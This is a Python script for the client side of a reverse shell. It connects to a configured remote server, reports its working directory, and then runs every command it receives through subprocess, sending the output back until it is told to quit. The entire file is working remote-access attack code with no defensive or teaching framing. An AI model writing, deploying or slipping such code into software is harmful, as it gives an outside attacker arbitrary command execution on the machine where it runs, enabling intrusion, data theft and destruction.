from reverse_server import BUFFERSIZE, SEPERATOR
import socket
import server_config
import os
import subprocess
import sys

SERVER_HOST = server_config.SERVER_HOST
SERVER_PORT = server_config.SERVER_PORT
BUFFERSIZE = 1024 * 128 # 128kib 
SEPERATOR = "<SEPERATOR>"

s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))

cwd = os.getcwd()
s.send(cwd.encode())

while True:
    ans = s.recv(BUFFERSIZE).decode()
    shell_ans = ans.split()
    if ans.lower() == "quit":
        # Close connection if command == "quit"
        break
    elif shell_ans[0].lower() == "cd":
        try:
            os.chdir(' '.join(shell_ans[1:]))
        except FileNotFoundError as e:
            # if there is an error, set as the output
            output = str(e)
        else:
            # if operation is successful, empty message
            output = ""
    else:
        # execute the command and retrieve the results
        output = subprocess.getoutput(ans)
    
    # get the current working directory as output
    cwd = os.getcwd()
    # send the results back to the server
    message = f"{output}{SEPERATOR}{cwd}"
    s.send(message.encode())
# close client connection
s.close()